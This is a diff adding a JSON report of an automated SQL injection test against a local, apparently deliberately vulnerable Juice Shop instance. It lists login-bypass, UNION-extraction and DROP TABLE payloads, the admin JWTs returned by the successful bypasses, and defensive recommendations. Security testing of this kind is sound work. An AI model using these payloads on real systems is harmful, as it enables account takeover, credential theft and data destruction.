@@ -1,0 +1,101 @@
+{
+  "attack_type": "SQL Injection",
+  "timestamp": "2025-10-16T02:41:02.056594",
+  "target": "http://localhost:3000",
+  "summary": {
+    "total_payloads_tested": 9,
+    "successful_login_bypasses": 2,
+    "vulnerabilities_found": 4,
+    "success_rate": 22.22222222222222
+  },
+  "detailed_results": [
+    {
+      "payload_id": 1,
+      "payload": "' OR '1'='1'--",
+      "status_code": 200,
+      "success": true,
+      "timestamp": "2025-10-16T02:40:54.825435",
+      "user_data": {
+        "authentication": {
+          "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTAtMTUgMTk6MDM6NDYuODg3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTAtMTUgMTk6MDM6NDYuODg3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MDU2NDQ1NX0.gCyBvoLX8vmsMj6Q0ja_84GsbKDrnweL_8Z__1uYnr9sGqrWUn-8YPLu0nT9x0dEmPWCTzpLYRYS2nBsxQ-LCBaOwg8gjMWg67sZUcSuhDu6b0u0Y3lLHkTp_vnkZFHiwVbR38A4I4AaIFBK2aCvyzzuwOQ5ORTOF0kPv62J9rk",
+          "bid": 1,
+          "umail": "admin@juice-sh.op"
+        }
+      }
+    },
+    {
+      "payload_id": 2,
+      "payload": "' OR 1=1--",
+      "status_code": 200,
+      "success": true,
+      "timestamp": "2025-10-16T02:40:55.866982",
+      "user_data": {
+        "authentication": {
+          "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMTAtMTUgMTk6MDM6NDYuODg3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMTAtMTUgMTk6MDM6NDYuODg3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc2MDU2NDQ1Nn0.f4B1zZACctV4bUjfPg_ndU-EJDMuKfkxfzewGXMsbeFETP7c4GBCnkjeWiDiFeyfOjoVNq805QbahpZD0yop0l1ZBb1ewSW27bUpC7vBBRrqca6yWvdZ3CfkkUc7QdY_79nwi4eJ1p0DasR55xLVphgmhbOWVzKkxg9upUDyWT8",
+          "bid": 1,
+          "umail": "admin@juice-sh.op"
+        }
+      }
+    },
+    {
+      "payload_id": 3,
+      "payload": "admin'--",
+      "status_code": 401,
+      "success": false,
+      "timestamp": "2025-10-16T02:40:56.895429"
+    },
+    {
+      "payload_id": 4,
+      "payload": "' OR 'a'='a",
+      "status_code": 401,
+      "success": false,
+      "timestamp": "2025-10-16T02:40:57.910188"
+    },
+    {
+      "payload_id": 5,
+      "payload": "admin'/*",
+      "status_code": 401,
+      "success": false,
+      "timestamp": "2025-10-16T02:40:58.944977"
+    },
+    {
+      "type": "search_injection",
+      "payload": "' UNION SELECT username, password FROM Users--",
+      "status_code": 500,
+      "response_length": 982,
+      "vulnerable": true,
+      "timestamp": "2025-10-16T02:40:59.973330"
+    },
+    {
+      "type": "search_injection",
+      "payload": "' AND 1=1--",
+      "status_code": 500,
+      "response_length": 942,
+      "vulnerable": true,
+      "timestamp": "2025-10-16T02:41:00.502933"
+    },
+    {
+      "type": "search_injection",
+      "payload": "'; DROP TABLE Products--",
+      "status_code": 500,
+      "response_length": 974,
+      "vulnerable": true,
+      "timestamp": "2025-10-16T02:41:01.033192"
+    },
+    {
+      "type": "search_injection",
+      "payload": "' OR EXISTS(SELECT * FROM Users)--",
+      "status_code": 500,
+      "response_length": 942,
+      "vulnerable": true,
+      "timestamp": "2025-10-16T02:41:01.555393"
+    }
+  ],
+  "recommendations": [
+    "Use parameterized queries or prepared statements",
+    "Implement proper input validation",
+    "Apply principle of least privilege for database accounts",
+    "Use web application firewalls",
+    "Regular security testing and code reviews"
+  ]
+}
